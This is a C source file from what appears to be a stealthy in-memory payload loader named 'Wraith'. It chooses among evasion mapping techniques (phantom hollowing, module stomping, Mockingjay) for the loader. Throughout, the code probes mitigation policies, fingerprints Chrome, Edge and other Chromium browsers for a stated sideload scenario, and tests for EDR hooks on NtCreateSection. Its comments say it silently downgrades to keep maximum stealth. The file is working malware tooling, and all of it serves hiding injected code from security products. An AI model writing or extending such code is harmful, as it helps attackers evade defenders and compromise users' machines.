/*
 * src/mapping/map_dispatch.c
 *
 * Strategy selection and shared helpers. Keeping this in one place means
 * the loader pipeline doesn't carry #ifdefs over which strategies are
 * compiled in.
 */

#include "mapping/map_strategy.h"
#include "pe/pe_constants.h"

#include <stdatomic.h>
#include <windows.h>
#include <winternl.h>

#if WRAITH_USE_PHANTOM_HOLLOWING
/* Process-wide cache of "is mapping a foreign image as SEC_IMAGE going
 * to fail in this process?" The detection runs in four layers, each
 * cheaper than the last and catching a different failure mode:
 *
 *   Layer 1 (policy probe): cheap, no syscalls. Reads the documented
 *   process mitigation policies that flatly veto SEC_IMAGE / dynamic
 *   code:
 *       - ProcessSignaturePolicy.MicrosoftSignedOnly
 *       - ProcessDynamicCodePolicy.ProhibitDynamicCode
 *
 *   Layer 2 (strict-environment probe): also cheap. Detects hardened
 *   sandboxes by checking ProcessExtensionPointDisablePolicy and
 *   ProcessImageLoadPolicy flags - any of these set strongly correlate
 *   with "MEM_IMAGE pages get rechecked at first execute and FailFast
 *   the process".
 *
 *   Layer 3 (Chromium fingerprint): cheap, no syscalls. Looks for
 *   chrome.exe / msedge.exe / brave.exe and friends, plus chrome*.dll
 *   modules in the loaded list. The browser process of every
 *   Chromium-based browser sets a bespoke kernel-side code integrity
 *   policy that's not exposed through GetProcessMitigationPolicy on
 *   all Windows versions - it kills phantom hollowing at first execute
 *   even when Layers 1, 2 and 4 all report "clean". Belt-and-braces
 *   for the canonical Chrome sideload scenario.
 *
 *   Layer 4 (active probe): only runs when Layers 1-3 are clean. We
 *   actually try to NtCreateSection(SEC_IMAGE) on a small System32
 *   DLL (version.dll) and immediately discard the section. This catches
 *   EDR hooks that synthesize a failure on foreign SEC_IMAGE creation,
 *   uncommon mitigations, etc.
 *
 * If any layer reports "blocked", wr_map_resolve silently downgrades
 * a PHANTOM_HOLLOW request to PRIVATE_RW_RX so the load still succeeds
 * with the strongest stealth this environment allows.
 *
 * Three states encoded as an atomic int:
 *   0 = uninitialized
 *   1 = probed, blocking detected
 *   2 = probed, no block
 */
static atomic_int g_phantom_blocked = 0;

#ifndef SEC_IMAGE
#  define SEC_IMAGE 0x01000000
#endif
#ifndef SECTION_ALL_ACCESS
#  define SECTION_ALL_ACCESS 0xF001F
#endif

static int probe_phantom_policy(void)
{
  typedef BOOL (WINAPI *fn_GetProcMit)(HANDLE, PROCESS_MITIGATION_POLICY,
                                       PVOID, SIZE_T);
  HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
  if (!k32) {
  return 0;
  }
  fn_GetProcMit get = (fn_GetProcMit)(void *)GetProcAddress(
      k32, "GetProcessMitigationPolicy");
  if (!get) {
  return 0;  /* old Windows: no mitigation policies, no block */
  }

  PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sig;
  ZeroMemory(&sig, sizeof(sig));
  if (get(GetCurrentProcess(), ProcessSignaturePolicy,
          &sig, sizeof(sig))
      && sig.MicrosoftSignedOnly) {
  return 1;
  }

  PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dyn;
  ZeroMemory(&dyn, sizeof(dyn));
  if (get(GetCurrentProcess(), ProcessDynamicCodePolicy,
          &dyn, sizeof(dyn))
      && dyn.ProhibitDynamicCode) {
  return 1;
  }

  return 0;
}

/* Strict-sandbox heuristic: detect process mitigations that
 * Chrome / Edge / Brave browser-process always set, and that strongly
 * correlate with "execution from a SEC_IMAGE region overlaid with
 * unsigned payload code is killed by the kernel/EDR mid-flight even
 * though NtCreateSection itself succeeded".
 *
 * The two failure modes we've observed:
 *   - the OS performs a code-integrity recheck on first execution of
 *     a page in a MEM_IMAGE region, notices the in-memory bytes don't
 *     match the on-disk backing PE, and FailFasts the process.
 *   - an EDR's user-mode kernel32/ntdll hook on memory protection
 *     changes is more aggressive on MEM_IMAGE pages than on
 *     MEM_PRIVATE pages.
 *
 * Either way, by the time the payload's DllMain runs the process is
 * already dead and SEH never gets to catch anything. The pre-flight
 * active probe (NtCreateSection + immediate close) doesn't trigger
 * these because no code ever executes from the probe section.
 *
 * The reliable proxy: Chrome browser process always sets
 *   ProcessExtensionPointDisablePolicy.DisableExtensionPoints
 * AND one of the hardening flags in
 *   ProcessImageLoadPolicy.{NoRemoteImages, NoLowMandatoryLabelImages,
 *                           PreferSystem32Images}
 * Both are visible via GetProcessMitigationPolicy without any active
 * probe. Either flag alone is enough of a signal that we're in a
 * hardened sandbox where phantom hollowing will be killed at execute. */
static int probe_phantom_strict_environment(void)
{
  typedef BOOL (WINAPI *fn_GetProcMit)(HANDLE, PROCESS_MITIGATION_POLICY,
                                       PVOID, SIZE_T);
  HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
  if (!k32) {
  return 0;
  }
  fn_GetProcMit get = (fn_GetProcMit)(void *)GetProcAddress(
      k32, "GetProcessMitigationPolicy");
  if (!get) {
  return 0;
  }

  /* ProcessExtensionPointDisablePolicy. The single most reliable
  * Chrome-browser fingerprint: legacy AppInit_DLLs / IME / hooks
  * blocked. Chrome Renderer, GPU, Utility processes also set it. */
  PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY ext;
  ZeroMemory(&ext, sizeof(ext));
  if (get(GetCurrentProcess(), ProcessExtensionPointDisablePolicy,
          &ext, sizeof(ext))
      && ext.DisableExtensionPoints) {
  return 1;
  }

  /* ProcessImageLoadPolicy. Chrome browser sets NoRemoteImages and
  * NoLowMandatoryLabelImages; some configs also set PreferSystem32Images.
  * Any of these implies the image-load path is locked down and our
  * SEC_IMAGE overlay is being scrutinized post-creation. */
  PROCESS_MITIGATION_IMAGE_LOAD_POLICY iml;
  ZeroMemory(&iml, sizeof(iml));
  if (get(GetCurrentProcess(), ProcessImageLoadPolicy,
          &iml, sizeof(iml))
      && (iml.NoRemoteImages
          || iml.NoLowMandatoryLabelImages
          || iml.PreferSystem32Images)) {
  return 1;
  }

  return 0;
}

/* Chromium fingerprint: detect Chrome / Edge / Brave / Opera / Vivaldi
 * etc. by either a known browser DLL being loaded in the current
 * process, or the executable basename matching one of the known
 * Chromium-derivative browsers.
 *
 * Why this layer exists: Chrome browser process passes Layers 1, 2 and
 * 4 of our probe chain clean, yet phantom hollowing still triggers a
 * crash inside the payload's DllMain - no SEH, no NTSTATUS, just a
 * silent FailFast. The kernel does an integrity recheck on the first
 * execute of any page in a MEM_IMAGE region whose backing PE doesn't
 * match what's now in memory, and the only reliable way to know we're
 * in that environment up-front is to recognize the browser by name.
 *
 * Module check is cheaper and more robust (works even if the
 * executable was renamed); name check catches statically linked
 * launchers and unusual deployments. Either signal is enough. */
static int probe_phantom_chromium(void)
{
  static const wchar_t *const kChromiumModules[] = {
  L"chrome.dll",  /* Chrome / Chromium / many Chromium forks */
  L"chrome_elf.dll",  /* Chrome's early loader */
  L"chrome_child.dll", /* legacy Chrome renderer/utility */
  L"msedge.dll",  /* Microsoft Edge browser process */
  L"msedge_elf.dll", /* Microsoft Edge ELF */
  L"brave.dll",  /* Brave */
  L"opera.dll",  /* Opera */
  L"vivaldi.dll",  /* Vivaldi */
  };
  for (size_t i = 0; i < sizeof(kChromiumModules) / sizeof(kChromiumModules[0]); ++i) {
  if (GetModuleHandleW(kChromiumModules[i])) {
  return 1;
  }
  }

  wchar_t exe[MAX_PATH];
  DWORD n = GetModuleFileNameW(NULL, exe, MAX_PATH);
  if (n == 0 || n >= MAX_PATH) {
  return 0;
  }
  /* Find basename. */
  wchar_t *base = exe;
  for (DWORD i = 0; i < n; ++i) {
  if (exe[i] == L'\\' || exe[i] == L'/') {
  base = &exe[i + 1];
  }
  }
  /* Lowercase the basename in place into a scratch buffer so the
  * comparisons below are case-insensitive without depending on
  * lstrcmpiW / CompareStringEx loader shape. */
  wchar_t lower[64];
  size_t li = 0;
  while (base[li] && li + 1 < (sizeof(lower) / sizeof(lower[0]))) {
  wchar_t c = base[li];
  if (c >= L'A' && c <= L'Z') {
  c = (wchar_t)(c - L'A' + L'a');
  }
  lower[li] = c;
  ++li;
  }
  lower[li] = L'\0';

  static const wchar_t *const kChromiumExes[] = {
  L"chrome.exe",
  L"chromium.exe",
  L"msedge.exe",
  L"msedgewebview2.exe",
  L"brave.exe",
  L"opera.exe",
  L"opera_gx.exe",
  L"vivaldi.exe",
  L"yandex.exe",
  L"thorium.exe",
  L"ungoogled-chromium.exe",
  };
  for (size_t i = 0; i < sizeof(kChromiumExes) / sizeof(kChromiumExes[0]); ++i) {
  /* Hand-rolled wcscmp to avoid pulling crt deps in static-link
  * configurations - the strings are short and ASCII. */
  const wchar_t *a = lower;
  const wchar_t *b = kChromiumExes[i];
  while (*a && *a == *b) { ++a; ++b; }
  if (*a == L'\0' && *b == L'\0') {
  return 1;
  }
  }

  return 0;
}

/* Active probe: try the same NtCreateSection(SEC_IMAGE) the phantom
 * strategy will issue, on a tiny System32 DLL we know exists on every
 * Windows host. If the call returns any non-success NTSTATUS we treat
 * phantom as broken in this process - this catches mitigations not
 * exposed via GetProcessMitigationPolicy and EDR hooks that synthesize
 * a failure for foreign SEC_IMAGE creation.
 *
 * The probe uses the direct ntdll exports rather than the indirect
 * syscall engine: the engine may not be initialized yet at this point
 * in the pipeline, and an EDR hook on NtCreateSection that vetoes the
 * call is exactly what we want to detect anyway. */
static int probe_phantom_active(void)
{
  typedef NTSTATUS (NTAPI *fn_NtCreateSection)(
      PHANDLE, ACCESS_MASK, void *, PLARGE_INTEGER,
      ULONG, ULONG, HANDLE);
  typedef NTSTATUS (NTAPI *fn_NtClose)(HANDLE);

  HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
  if (!ntdll) {
  return 0;  /* without ntdll we can't do anything; assume not blocked */
  }
  fn_NtCreateSection p_NtCreateSection = (fn_NtCreateSection)(void *)
      GetProcAddress(ntdll, "NtCreateSection");
  fn_NtClose p_NtClose = (fn_NtClose)(void *)
      GetProcAddress(ntdll, "NtClose");
  if (!p_NtCreateSection || !p_NtClose) {
  return 0;
  }

  /* Build %SystemRoot%\System32\version.dll - small (~30 KiB), present
   * on every Windows install since Win2000. */
  wchar_t path[MAX_PATH];
  UINT n = GetSystemDirectoryW(path, MAX_PATH);
  if (n == 0 || n + 13 >= MAX_PATH) {
  return 0;
  }
  if (path[n - 1] != L'\\') {
  path[n++] = L'\\';
  }
  static const wchar_t kProbeDll[] = L"version.dll";
  for (size_t i = 0; i < sizeof(kProbeDll) / sizeof(kProbeDll[0]); ++i) {
  path[n + i] = kProbeDll[i];
  }

  HANDLE hf = CreateFileW(path, GENERIC_READ | GENERIC_EXECUTE,
                          FILE_SHARE_READ, NULL, OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL, NULL);
  if (hf == INVALID_HANDLE_VALUE) {
  return 0;  /* file inaccessible - that's a different problem */
  }

  /* Try the same NtCreateSection invocation phantom uses, walking the
   * canonical retry chain for SectionPageProtection. STATUS_INVALID_
   * PAGE_PROTECTION (0xC00000F4) means "wrong protection for this kernel
   * variant", retry. Any other non-zero NTSTATUS means a real veto
   * (signing, dynamic-code, EDR refusal). Status 0 means SEC_IMAGE works
   * here. */
  static const ULONG kProtAttempts[] = {
  PAGE_READONLY,
  PAGE_EXECUTE,
  PAGE_EXECUTE_READ,
  PAGE_EXECUTE_WRITECOPY,
  };
  HANDLE sec = NULL;
  NTSTATUS s = (NTSTATUS)0xC00000F4;
  for (size_t pi = 0; pi < sizeof(kProtAttempts) / sizeof(kProtAttempts[0]); ++pi) {
  s = p_NtCreateSection(&sec, SECTION_ALL_ACCESS, NULL, NULL,
                        kProtAttempts[pi], SEC_IMAGE, hf);
  if (s == 0) {
  break;
  }
  if ((unsigned)s != 0xC00000F4u) {
  break;
  }
  }
  CloseHandle(hf);
  if (s == 0 && sec) {
  p_NtClose(sec);
  return 0;  /* phantom works in this process */
  }
  return 1;  /* SEC_IMAGE refused - phantom is broken here */
}

static int phantom_is_blocked(void)
{
  int s = atomic_load(&g_phantom_blocked);
  if (s != 0) {
  return s == 1;
  }
  int blocked = probe_phantom_policy();
  if (!blocked) {
  blocked = probe_phantom_strict_environment();
  }
  if (!blocked) {
  blocked = probe_phantom_chromium();
  }
  if (!blocked) {
  blocked = probe_phantom_active();
  }
  atomic_store(&g_phantom_blocked, blocked ? 1 : 2);
  return blocked;
}

/* Public entrypoint for other TUs (loader_pipeline) to mark phantom as
 * unusable after a runtime failure - the next wr_map_resolve call will
 * pick private_rwx without re-probing. */
void wr_phantom_mark_blocked(void);
void wr_phantom_mark_blocked(void)
{
  atomic_store(&g_phantom_blocked, 1);
}
#endif  /* WRAITH_USE_PHANTOM_HOLLOWING */

const struct wr_map_ops *wr_map_resolve(wraith_map_strategy_t id)
{
  switch (id) {
  case WRAITH_MAP_PRIVATE_RW_RX:
  return &wr_map_ops_private_rwx;

#if WRAITH_USE_PHANTOM_HOLLOWING
  case WRAITH_MAP_PHANTOM_HOLLOW:
  /* Auto-degradation: when the host process forbids foreign
   * SEC_IMAGE mappings (MicrosoftSignedOnly) or dynamic code
   * (ProhibitDynamicCode), the phantom strategy would crash or
   * be vetoed by the kernel. Silently fall back to private
   * RW->RX so the load still succeeds with the strongest
   * stealth this environment allows. */
  if (phantom_is_blocked()) {
  return &wr_map_ops_private_rwx;
  }
  return &wr_map_ops_phantom;
#endif

#if WRAITH_USE_MODULE_STOMPING
  case WRAITH_MAP_MODULE_STOMPING:
  return &wr_map_ops_stomping;
#endif

  case WRAITH_MAP_MOCKINGJAY:
  return &wr_map_ops_mockingjay;

  default:
  return NULL;
  }
}

unsigned wr_prot_to_win32(wraith_prot_t prot)
{
  unsigned base = 0;
  unsigned modifier = 0;

  if (prot & WRAITH_PROT_NOCACHE) {
  modifier |= PAGE_NOCACHE;
  }
  if (prot & WRAITH_PROT_GUARD) {
  modifier |= PAGE_GUARD;
  }

  switch (prot & 0xff) {
  case WRAITH_PROT_NOACCESS: base = PAGE_NOACCESS;  break;
  case WRAITH_PROT_R:  base = PAGE_READONLY;  break;
  case WRAITH_PROT_RW:  base = PAGE_READWRITE;  break;
  case WRAITH_PROT_RX:  base = PAGE_EXECUTE_READ;  break;
  case WRAITH_PROT_WC:  base = PAGE_WRITECOPY;  break;
  case WRAITH_PROT_RWC:  base = PAGE_WRITECOPY;  break; /* same flag in Win32 */
  case WRAITH_PROT_RXC:  base = PAGE_EXECUTE_WRITECOPY; break;
  default:
  /* Reject RWX combinations explicitly when RW_TO_RX_HYGIENE is on.
  * Currently we never even synthesize the bit, but be defensive. */
  return 0;
  }

  return base | modifier;
}

wraith_prot_t wr_prot_from_section_chars(uint32_t c)
{
  int execute = (c & WRAITH_PE_SCN_MEM_EXECUTE) != 0;
  int read  = (c & WRAITH_PE_SCN_MEM_READ)  != 0;
  int write  = (c & WRAITH_PE_SCN_MEM_WRITE)  != 0;

  /* RW_TO_RX hygiene: there is no RWX state. The loader must commit
  * sections RW, then flip RX after relocations + imports. The "final"
  * protection used here is what `protect` will apply once writes
  * are no longer needed. */
  wraith_prot_t p = WRAITH_PROT_NOACCESS;
  if (execute && read && !write) {
  p = WRAITH_PROT_RX;
  } else if (execute && read && write) {
  /* Forbidden in v2. Caller is expected to split this into a
  * post-write VirtualProtect to RX-only. We return RX so the
  * loader strips the write bit. */
  p = WRAITH_PROT_RX;
  } else if (!execute && read && write) {
  p = WRAITH_PROT_RW;
  } else if (!execute && read && !write) {
  p = WRAITH_PROT_R;
  } else if (execute && !read && !write) {
  p = WRAITH_PROT_RX;  /* read implied for execute on x64 */
  }

  if (c & WRAITH_PE_SCN_MEM_NOT_CACHED) {
  p |= WRAITH_PROT_NOCACHE;
  }
  return p;
}
